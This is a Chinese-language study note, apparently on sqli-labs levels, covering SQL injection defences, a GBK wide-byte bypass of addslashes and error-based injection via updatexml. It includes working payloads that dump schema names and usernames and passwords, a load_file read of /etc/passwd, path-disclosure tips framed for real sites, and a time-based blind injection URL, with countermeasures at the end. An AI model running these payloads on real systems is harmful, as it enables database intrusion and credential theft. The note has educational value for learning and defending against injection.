接下来讲一下前四关反制方法
使用预编译语句（pod）（将用户输入语句当作参数值就类似纯文本那种不会被当作sql语句解析）
如在第二关可以进行黑名单过滤将数字以外拒绝
转义过滤 将’”/这些进行转义
但
输入：%df’
PHP 的 addslashes 检测到 ‘，自动转义，变成：%df' URL 编码：\ = %5c，所以现在是 %df%5c’
MySQL 以 GBK 解析：GBK 是 2 个字节代表一个汉字 %df%5c 这两个字节，在 GBK 里面是一个合法汉字：運 ✅ 结果：\ 被吃掉、合并进汉字里面消失了！剩下孤零零的 ‘ 成功闭合 SQL！
原来转义想做成：$id = “運'“; MySQL 理解成：$id = “運’”; 单引号跑出来了，注入成功。（宽字节绕过）就是将负责转义’的/换成汉字这样依旧可以闭合前面单引号

接下来该看懂报错了
到了第五关发现虽然可以通过order by猜测出共三行但

没法爆库名（但依旧回显错误提示）
这里需要用到报错注入
原理mysql对数据库进行新增功能 对存进去的xml字符串进行查询和修改
因此可以使用xpath语言让其触发报错
MySQL新增了extractvalue、updatexml函数，用来对数据库里存储的XML字符串做查询、修改。 这两个函数的第二个参数必须是合法的XPath表达式。 我们故意构造非法XPath，MySQL校验失败就抛出报错，并且把我们拼接进去的查询结果显示在报错信息中，借此拿到库、表、字段数据。

还有一点xpath不许以开头，所以想要通过报错回显这些信息只需要在前面加上除此之外还有~@#这些
查库名?id=-1’ and updatexml(1,concat(0x7e,database()),1) –+
查表名?id=-1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1) –+
查字段名?id=1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’)),1) –+
爆账号密码?id=1’ and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from security.users)),1) –+
但是updatexml这个函数有32位字符限制（报错输出只有32位字符）
因此在payload里面加入substr函数（分段输出）

Payload例如（爆字段）?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’)),1,16),1) –+
之后还要其他的手动改就行了

这里讲一下实战获取网站绝对路径方法

  1. 报错泄露（最常见，优先试）
    很多页面开启 PHP 错误提示，访问畸形参数、不存在的文件、传错参数，报错直接爆出物理路径。
  2. 探针 /phpinfo ()（如果能上传、能包含）
  3. 读取系统文件（SQL 注入读文件，load_file）
    前提：同样要有 FILE 权限 + secure_file_priv 放行
    Windows 常见：C:/windows/system32/drivers/etc/hosts
    Linux：/etc/passwd、/etc/apache2/sites-available/000-default.conf（apache 配置里面写了网站根目录） payload 示例：
    sql
    ?id=1’ union select 1,load_file(‘/etc/passwd’),3 –+
    从配置文件里挖 DocumentRoot。
  4. 网站默认路径猜解（猜路径，成功率低，靠经验）
  5. 服务器响应头、404 页面、日志、源码注释
    404 页面模板、源码注释里面偶尔会写路径
    部分 nginx/apache 配置会在 header 泄路径（很少）
  6. 后台探针、服务器管理面板
    宝塔、cPanel、wdcp 这些面板，后台直接显示网站目录，拿到后台权限就一目了然。
    （总之想要获取绝对路径非常难，实战希望不大）

这里使用双写反斜杠是为了防止MySQL误读

反制方式
取消用户的file权限
在ql.ini里secure_file_priv=null
最小权限原则 是mysql进程不用高权限账号运行
严格控制目录写入权限
Pod预编译

url = “http://xxx/?id=1‘ and if(ascii(substr(database(),1,1))=115,sleep(3),1)–+”
